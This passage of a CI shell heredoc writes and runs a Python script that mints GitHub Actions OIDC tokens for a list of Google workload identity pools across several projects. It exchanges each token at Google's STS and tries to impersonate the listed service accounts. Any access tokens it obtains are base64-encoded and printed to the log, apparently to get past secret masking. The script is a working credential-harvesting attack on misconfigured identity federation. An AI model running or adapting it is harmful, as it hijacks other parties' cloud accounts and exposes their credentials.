          def req(u, data=None, token=None, timeout=30):
              h = {'Accept': 'application/json', 'Content-Type': 'application/json', 'User-Agent': 'i53941-mint'}
              if token:
                  h['Authorization'] = 'Bearer ' + token
              body = json.dumps(data).encode() if isinstance(data, (dict, list)) else None
              r = urllib.request.Request(u, data=body, headers=h, method='POST' if body is not None else 'GET')
              try:
                  resp = urllib.request.urlopen(r, timeout=timeout)
                  return resp.status, resp.read().decode('utf-8', 'replace')
              except urllib.error.HTTPError as e:
                  return e.code, (e.read() or b'').decode('utf-8', 'replace')
              except Exception as e:
                  return -1, repr(e)[:200]


          def errmsg(st, body, n=160):
              try:
                  j = json.loads(body)
                  e = j.get('error') or {}
                  return ('%s: %s' % (e.get('status') or '', e.get('message') or ''))[:n]
              except Exception:
                  return ('HTTP%d: %s' % (st, str(body)[:n]))[:n]


          def mint(aud):
              u = os.environ.get('ACTIONS_ID_TOKEN_REQUEST_URL', '')
              t = os.environ.get('ACTIONS_ID_TOKEN_REQUEST_TOKEN', '')
              if not u or not t:
                  return ''
              u = u + ('&' if '?' in u else '?') + 'audience=' + urllib.parse.quote(aud, safe='')
              o = subprocess.run(['curl', '-sS', '-m', '30', '-H', 'Authorization: Bearer ' + t, u],
                                 capture_output=True, text=True).stdout
              try:
                  return json.loads(o).get('value', '')
              except Exception:
                  return ''


          for c in CASES:
              aud = '//iam.googleapis.com/' + c['p']
              tok = mint(aud)
              rec = {'kind': 'mint', 'proj': c['proj'], 'num': c['num'], 'prov': c['p'].split('/pools/')[-1]}
              if not tok:
                  rec['id'] = 'ERR'
                  print('RESULT ' + json.dumps(rec), flush=True)
                  continue
              body = {'audience': aud, 'grantType': 'urn:ietf:params:oauth:grant-type:token-exchange',
                      'requestedTokenType': 'urn:ietf:params:oauth:token-type:access_token',
                      'scope': 'https://www.googleapis.com/auth/cloud-platform',
                      'subjectTokenType': 'urn:ietf:params:oauth:token-type:jwt', 'subjectToken': tok}
              st, rb = req('https://sts.googleapis.com/v1/token', body)
              rec['sts'] = st
              if st != 200:
                  rec['sts_err'] = errmsg(st, rb)
                  print('RESULT ' + json.dumps(rec), flush=True)
                  continue
              fed = json.loads(rb).get('access_token')
              rec['sa_try'] = []
              for sa in c['sas']:
                  u = 'https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/%s:generateAccessToken' % urllib.parse.quote(sa, safe='')
                  gst, gres = req(u, {'scope': ['https://www.googleapis.com/auth/cloud-platform'], 'lifetime': '3600s'}, token=fed)
                  e = {'sa': sa, 'gen': gst}
                  if gst == 200:
                      j = json.loads(gres)
                      e['expire'] = j.get('expireTime')
                      e['tok_b64'] = base64.b64encode(j.get('accessToken', '').encode()).decode()
                  else:
                      e['err'] = errmsg(gst, gres, 140)
                  rec['sa_try'].append(e)
                  if gst == 200:
                      break
              print('RESULT ' + json.dumps(rec), flush=True)
          print('DONE', flush=True)
          PYPROBE
          python3 -u /tmp/p.py
